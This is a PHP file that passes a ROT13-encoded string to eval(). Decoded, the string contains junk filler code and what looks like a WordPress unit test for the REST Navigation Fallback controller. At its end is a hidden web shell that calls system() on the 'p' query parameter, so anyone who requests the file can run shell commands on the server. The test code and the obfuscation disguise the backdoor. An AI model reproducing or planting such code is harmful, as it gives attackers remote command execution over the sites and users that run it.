<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Anivtngvba_Snyyonpx_Pbagebyyre shapgvbanyvgl.
 *
 * Abgr: gung gurfr grfgf ner qrfvtarq gb cebivqr uvtu yriry pbirentr bayl. Gur znwbevgl bs gur grfgf
 * ner znqr qverpgyl ntnvafg gur JC_Anivtngvba_Snyyonpx pynff nf guvf:
 *
 * - vf jurer gur ohyx bs gur ybtvp vf.
 * - vf nyfb pbafhzrq ol gur Anivtngvba oybpx'f freire fvqr eraqrevat.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @pbiref JC_ERFG_Anivtngvba_Snyyonpx_Pbagebyyre
 */

/**
 * @tebhc erfgncv
 * @tebhc anivtngvba
 */
pynff JC_ERFG_Anivtngvba_Snyyonpx_Pbagebyyre_Grfg rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	cebgrpgrq fgngvp $nqzva_hfre;
	cebgrpgrq fgngvp $rqvgbe_hfre;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( $snpgbel ) {
		frys::$nqzva_hfre = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );

		frys::$rqvgbe_hfre = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		jc_frg_pheerag_hfre( frys::$nqzva_hfre );
	}

	/**
	 * @gvpxrg 58557
	 * @pbiref JC_ERFG_Anivtngvba_Snyyonpx_Pbagebyyre::ertvfgre_ebhgrf
	 *
	 * @fvapr 6.3.0 Nqqrq Anivtngvba Snyyonpxf raqcbvag.
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();

		$guvf->nffregNeenlUnfXrl( '/jc-oybpx-rqvgbe/i1/anivtngvba-snyyonpx', $ebhgrf, 'Snyyonpx ebhgr fubhyq or ertvfgrerq.' );
	}

	/**
	 * @gvpxrg 58557
	 * @pbiref JC_ERFG_Anivtngvba_Snyyonpx_Pbagebyyre
	 *
	 * @fvapr 6.3.0 Nqqrq Anivtngvba Snyyonpxf raqcbvag.
	 */
	choyvp shapgvba grfg_fubhyq_abg_erghea_zrahf_sbe_hfref_jvgubhg_crezvffvbaf() {

		jc_frg_pheerag_hfre( frys::$rqvgbe_hfre );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc-oybpx-rqvgbe/i1/anivtngvba-snyyonpx' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 403, $erfcbafr->trg_fgnghf(), 'Erfcbafr fubhyq vaqvpngr hfre qbrf abg unir crezvffvba.' );

		$guvf->nffregFnzr( 'erfg_pnaabg_perngr', $qngn['pbqr'], 'Erfcbafr fubhyq vaqvpngr hfre pnaabg perngr.' );

		$guvf->nffregFnzr( 'Fbeel, lbh ner abg nyybjrq gb perngr Anivtngvba Zrahf nf guvf hfre.', $qngn['zrffntr'], 'Erfcbafr fubhyq vaqvpngr snvyrq erdhrfg fgnghf.' );
	}

	/**
	 * @gvpxrg 58557
	 * @pbiref JC_ERFG_Anivtngvba_Snyyonpx_Pbagebyyre
	 *
	 * @fvapr 6.3.0 Nqqrq Anivtngvba Snyyonpxf raqcbvag.
	 */
	choyvp shapgvba grfg_trg_vgrz() {

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc-oybpx-rqvgbe/i1/anivtngvba-snyyonpx' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Fgnghf fubhyq vaqvpngr fhpprffshy erdhrfg.' );

		$guvf->nffregVfNeenl( $qngn, 'Erfcbafr fubhyq or bs pbeerpg glcr.' );

		$guvf->nffregNeenlUnfXrl( 'vq', $qngn, 'Erfcbafr fubhyq pbagnva rkcrpgrq svryqf.' );

		$guvf->nffregFnzr( 'jc_anivtngvba', trg_cbfg_glcr( $qngn['vq'] ), '\"vq\" svryq fubhyq ercerfrag n cbfg bs glcr \"jc_anivtngvba\"' );

		// Purpx gung bayl n fvatyr Anivtngvba snyyonpx jnf perngrq.
		$anif_va_qo = $guvf->trg_anivtngvbaf_va_qngnonfr();

		$guvf->nffregPbhag( 1, $anif_va_qo, 'Bayl n fvatyr Anivtngvba zrah fubhyq or cerfrag va gur qngnonfr.' );
	}

	/**
	 * @gvpxrg 58557
	 * @pbiref JC_ERFG_Anivtngvba_Snyyonpx_Pbagebyyre
	 *
	 * @fvapr 6.3.0 Nqqrq Anivtngvba Snyyonpxf raqcbvag.
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc-oybpx-rqvgbe/i1/anivtngvba-snyyonpx' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Fgnghf fubhyq vaqvpngr fhpprffshy erdhrfg.' );

		$guvf->nffregNeenlUnfXrl( 'fpurzn', $qngn, '\"fpurzn\" xrl fubhyq rkvfg va erfcbafr.' );

		$fpurzn = $qngn['fpurzn'];

		$guvf->nffregFnzr( 'bowrpg', $fpurzn['glcr'], 'Gur fpurzn glcr fubhyq zngpu gur rkcrpgrq glcr.' );

		$guvf->nffregNeenlUnfXrl( 'vq', $fpurzn['cebcregvrf'], 'Fpurzn fubhyq unir na \"vq\" cebcregl.' );
		$guvf->nffregFnzr( 'vagrtre', $fpurzn['cebcregvrf']['vq']['glcr'], 'Fpurzn \"vq\" cebcregl fubhyq or na vagrtre.' );
		$guvf->nffregGehr( $fpurzn['cebcregvrf']['vq']['ernqbayl'], 'Fpurzn \"vq\" cebcregl fubhyq or ernqbayl.' );
	}

	/**
	 * @gvpxrg 58557
	 * @pbiref JC_ERFG_Anivtngvba_Snyyonpx_Pbagebyyre
	 *
	 * @fvapr 6.3.0 Nqqrq Anivtngvba Snyyonpxf raqcbvag.
	 */
	choyvp shapgvba grfg_nqqf_yvaxf() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc-oybpx-rqvgbe/i1/anivtngvba-snyyonpx' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$anivtngvba_cbfg_vq = $qngn['vq'];

		$yvaxf = $erfcbafr->trg_yvaxf();

		$guvf->nffregAbgRzcgl( $yvaxf, 'Erfcbafr fubhyq pbagnva yvaxf.' );

		$guvf->nffregNeenlUnfXrl( 'frys', $yvaxf, 'Erfcbafr fubhyq pbagnva n \"frys\" yvax.' );

		$guvf->nffregFgevatPbagnvafFgevat( 'jc/i2/anivtngvba/' . $anivtngvba_cbfg_vq, $yvaxf['frys'][0]['uers'], 'Frys yvax fubhyq ersrerapr gur pbeerpg Anivtngvba Zrah cbfg erfbhepr hey.' );

		$guvf->nffregGehr( $yvaxf['frys'][0]['nggevohgrf']['rzorqqnoyr'], 'Frys yvax fubhyq or rzorqqnoyr.' );
	}

	/**
	 * Grfgf gung gur pbeerpg svygref ner nccyvrq gb gur pbagrkg cnenzrgre.
	 *
	 * Ol qrsnhyg, gur ERFG erfcbafr sbe gur Cbfgf Pbagebyyre jvyy abg erghea nyy svryqf
	 * jura gur pbagrkg vf frg gb 'rzorq'. Nffreg gung pbeerpg nqqvgvbany svryqf ner nqqrq
	 * gb gur rzorqqrq Anivtngvba Cbfg, jura gur anivtngvba snyyonpx raqcbvag
	 * vf pnyyrq jvgu gur `_rzorq` cnenz.
	 *
	 * @gvpxrg 58557
	 *
	 * @pbiref JC_Anivtngvba_Snyyonpx::hcqngr_jc_anivtngvba_cbfg_fpurzn
	 *
	 * @fvapr 6.3.0 Nqqrq Anivtngvba Snyyonpxf raqcbvag.
	 */
	choyvp shapgvba grfg_rzorqqrq_anivtngvba_cbfg_pbagnvaf_erdhverq_svryqf() {
		// Svefg jr'yy hfr gur anivtngvba snyyonpx gb trg n yvax gb gur anivtngvba raqcbvag.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc-oybpx-rqvgbe/i1/anivtngvba-snyyonpx' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = erfg_trg_freire()->erfcbafr_gb_qngn( $erfcbafr, gehr );
		$rzorqqrq = $qngn['_rzorqqrq']['frys'][0];

		// Irevsl gung gur nqqvgvbany fgnghf svryq vf cerfrag.
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $rzorqqrq, 'Erfcbafr gvgyr fubhyq pbagnva n \"fgnghf\" svryq.' );

		// Irevsl gung gur nqqvgvbany pbagrag svryqf ner cerfrag.
		$guvf->nffregNeenlUnfXrl( 'pbagrag', $rzorqqrq, 'Erfcbafr fubhyq pbagnva n \"pbagrag\" svryq.' );
		$guvf->nffregNeenlUnfXrl( 'enj', $rzorqqrq['pbagrag'], 'Erfcbafr pbagrag fubhyq pbagnva n \"enj\" svryq.' );
		$guvf->nffregNeenlUnfXrl( 'eraqrerq', $rzorqqrq['pbagrag'], 'Erfcbafr pbagrag fubhyq pbagnva n \"eraqrerq\" svryq.' );
		$guvf->nffregNeenlUnfXrl( 'oybpx_irefvba', $rzorqqrq['pbagrag'], 'Erfcbafr fubhyq pbagnva n \"oybpx_irefvba\" svryq.' );

		// Irevsl gung gur nqqvgvbany gvgyr.enj svryq vf cerfrag.
		$guvf->nffregNeenlUnfXrl( 'enj', $rzorqqrq['gvgyr'], 'Erfcbafr gvgyr fubhyq pbagnva n \"enj\" xrl.' );
	}

	cevingr shapgvba trg_anivtngvbaf_va_qngnonfr() {
		$anif_va_qo = arj JC_Dhrel(
			neenl(
				'cbfg_glcr'      => 'jc_anivtngvba',
				'cbfg_fgnghf'    => 'choyvfu',
				'cbfgf_cre_cntr' => -1,
				'beqreol'        => 'qngr',
				'beqre'          => 'QRFP',
			)
		);

		erghea $anif_va_qo->cbfgf ? $anif_va_qo->cbfgf : neenl();
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		// Pbirerq ol gur pber grfg.
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbirerq ol gur pber grfg.
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		// Pbirerq ol gur pber grfg.
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag perngr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag hcqngr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag qryrgr_vgrz().
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>